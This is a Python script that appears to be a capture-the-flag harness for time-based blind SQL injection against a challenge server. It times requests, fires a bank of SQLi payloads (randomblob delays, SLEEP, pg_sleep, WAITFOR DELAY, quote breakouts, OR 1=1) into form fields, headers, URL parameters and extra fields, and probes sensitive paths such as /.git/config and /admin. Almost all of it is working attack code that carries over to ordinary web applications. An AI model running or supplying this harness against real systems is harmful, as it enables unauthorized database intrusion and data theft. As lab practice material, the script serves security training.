#!/usr/bin/env python3
"""
Time-based blind SQLi harness for http://sqli6.chal.deti:8035

The app returns the same flash for every submission, so the only
discriminator is response latency. Baseline: median over 5 benign POSTs.
Every payload: median over 3 POSTs. Signal: > 300 ms slower than baseline.

randomblob(100_000_000) inside SQLite takes 1-5s -> unmistakable.
"""
import requests, time, statistics, sys
from urllib.parse import urljoin

BASE = "http://sqli6.chal.deti:8035"
sess = requests.Session()

def _do(method, path, **kw):
    url = urljoin(BASE, path)
    t0 = time.perf_counter()
    try:
        r = sess.request(method, url, timeout=30, **kw)
        return time.perf_counter() - t0, r
    except requests.RequestException:
        return None, None

def measure(method, path, n=3, **kw):
    ts, last = [], None
    for _ in range(n):
        dt, r = _do(method, path, **kw)
        if dt is not None:
            ts.append(dt); last = r
    if not ts:
        return None, None
    return statistics.median(ts), last

def report(label, med, base, last=None, base_len=None):
    if med is None:
        print(f"  [ERR]                       {label}")
        return
    d = (med - base) * 1000
    if d > 300:        mark = " ***SLOW***"
    elif d > 100:      mark = " (slowish)"
    elif d < -100:     mark = " (fast)"
    else:              mark = ""
    extra = ""
    if last is not None and base_len is not None and len(last.text) != base_len:
        extra = f" [len={len(last.text)} vs {base_len}]"
    print(f"  {d:+7.1f}ms {mark}{extra}  {label}")

# --- baseline ---
print("[*] Baseline ...")
b_med, b_r = measure("POST", "/", data={"name":"t","message":"hello"}, n=5)
if b_med is None:
    print("[-] Target unreachable"); sys.exit(1)
b_len = len(b_r.text)
print(f"[*] POST / baseline: {b_med*1000:.1f} ms, len={b_len}")
print(f"[*] Response snippet: {b_r.text[:160]!r}\n")

# --- payload bank ---
SQLITE = ["randomblob(10000000)",
          "randomblob(50000000)",
          "randomblob(100000000)"]
OTHER  = ["SLEEP(2)", "pg_sleep(2)",
          "1; WAITFOR DELAY '0:0:2'"]

def msg_variants():
    out = ["hello", "x''y", "x''''y", "x'''y"]
    for f in SQLITE:
        out += [
            f"x' || {f} || 'y",              # quote breakout (blocked if filter)
            f"x'' || {f} || ''y",            # paired-quote attempt
            f"x'', {f}) -- ",                # close column + add expr
            f"x'', 1, {f}) -- ",             # multi-arg
            f"', {f}) -- ",
            f"', (SELECT {f})) -- ",
        ]
    for f in OTHER:
        out += [f"x' || {f} || 'y", f"x', {f}) -- "]
    return out

# --- 1) message field ---
print("[*] Testing `message` (POST /)")
for p in msg_variants():
    med, r = measure("POST", "/", data={"name":"t","message":p}, n=3)
    report(f"msg={p[:70]!r}", med, b_med, r, b_len)

# --- 2) name field ---
print("\n[*] Testing `name` (POST /)")
for p in msg_variants():
    med, r = measure("POST", "/", data={"name":p,"message":"hello"}, n=3)
    report(f"name={p[:70]!r}", med, b_med, r, b_len)

# --- 3) headers ---
print("\n[*] Testing headers (POST / with benign body)")
HDRS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
        "Cookie", "Authorization", "X-Client-IP", "Forwarded"]
HPAYLOADS = [
    "'",
    "1' AND 1=1-- ",
    "' AND randomblob(100000000)-- ",
    "1 AND randomblob(100000000)",
    "1' AND randomblob(100000000) AND '1'='1",
]
for h in HDRS:
    for p in HPAYLOADS:
        med, _ = measure("POST", "/", data={"name":"t","message":"hello"},
                         headers={h: p}, n=3)
        if med is not None and abs((med - b_med) * 1000) > 100:
            report(f"{h}={p[:45]!r}", med, b_med)

# --- 4) URL params on GET / ---
g_med, g_r = measure("GET", "/", n=5)
print(f"\n[*] GET / baseline: {g_med*1000:.1f} ms, len={len(g_r.text)}")
PARAMS = ["q","name","search","tag","id","page","offset","limit","sort",
          "order","message","note","note_id","user","author","email",
          "signed","date","timestamp","where"]
PPAYLOADS = ["'", "1'", "1'-- ", "1' OR 1=1-- ",
             "1 AND randomblob(100000000)",
             "' OR randomblob(100000000)-- "]
print("[*] Testing URL params on GET /")
for param in PARAMS:
    for p in PPAYLOADS:
        med, r = measure("GET", "/", params={param: p}, n=3)
        if med is not None and abs((med - g_med) * 1000) > 100:
            report(f"?{param}={p[:45]!r}", med, g_med, r, len(g_r.text))

# --- 5) extra POST fields ---
print("\n[*] Testing extra POST fields")
for extra in ["signed","timestamp","date","created","created_at",
              "id","note_id","author","user","email"]:
    for p in ["'", "1'-- ", "1' OR 1=1-- ",
              "2026-01-01' AND randomblob(100000000)-- "]:
        med, r = measure("POST", "/",
                         data={"name":"t","message":"hello", extra: p}, n=3)
        if med is not None and abs((med - b_med) * 1000) > 100:
            report(f"{extra}={p[:45]!r}", med, b_med, r, b_len)

# --- 6) content-type variations ---
print("\n[*] Testing alternate Content-Types")
for ct, body in [("application/json", '{"name":"t","message":"hello"}'),
                 ("application/json", '{"name":"t","message":"x\'-- "}'),
                 ("text/plain",       'name=t&message=hello')]:
    med, _ = measure("POST", "/", data=body, headers={"Content-Type": ct}, n=3)
    report(f"CT={ct} body={body[:40]!r}", med, b_med)

# --- 7) path discovery (any non-404 gets a timing probe) ---
print("\n[*] Probing paths (non-404 reported)")
for path in ["/notes","/note","/api","/api/notes","/api/v1/notes",
             "/search","/find","/admin","/debug","/health","/status",
             "/robots.txt","/export","/download","/note/1","/console",
             "/login","/flag","/.git/config"]:
    dt, r = _do("GET", path)
    if r is None: continue
    if r.status_code != 404:
        print(f"  HTTP {r.status_code}  {dt*1000:6.1f}ms  len={len(r.text):6d}  {path}")

print("\n[*] Done. Any ***SLOW*** line above is a confirmed time-oracle candidate.")
